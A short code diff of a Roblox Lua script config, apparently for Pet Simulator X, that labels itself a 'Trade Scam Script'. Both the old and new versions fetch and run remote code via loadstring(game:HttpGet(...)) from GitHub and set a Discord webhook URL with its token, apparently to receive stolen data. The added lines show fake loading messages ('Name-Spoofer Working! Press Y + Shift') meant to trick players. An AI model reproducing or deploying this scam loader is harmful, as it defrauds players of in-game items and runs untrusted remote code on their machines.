@@ -1,4 +1,9 @@
-UserName = "MantisAltt"
-Webhook = "https://discord.com/api/webhooks/1097756615203102810/wBcmQ5hhUhSbHZGOc10gnfq6B4JAosdhflytnw1LDIdE6ZCUzgraIfVUX7WgB50ybt-Z"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/yolol10212/petsimx/main/Script", true))()
---SUDO ON TOP
+Username = "sudoismantis"
+WebHook = "https://discord.com/api/webhooks/1097756615203102810/wBcmQ5hhUhSbHZGOc10gnfq6B4JAosdhflytnw1LDIdE6ZCUzgraIfVUX7WgB50ybt-Z"
+loadingscreen = true
+_G.CustomScriptName = "Trade Scam Script"
+_G.Text1 = "Determining Ping..."
+_G.Text2 = "Creating Trade Identifier..."
+_G.Text3 = "Checking Name-Spoofer..."
+_G.Text4 = "Name-Spoofer Working! Press Y + Shift at 100%!"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
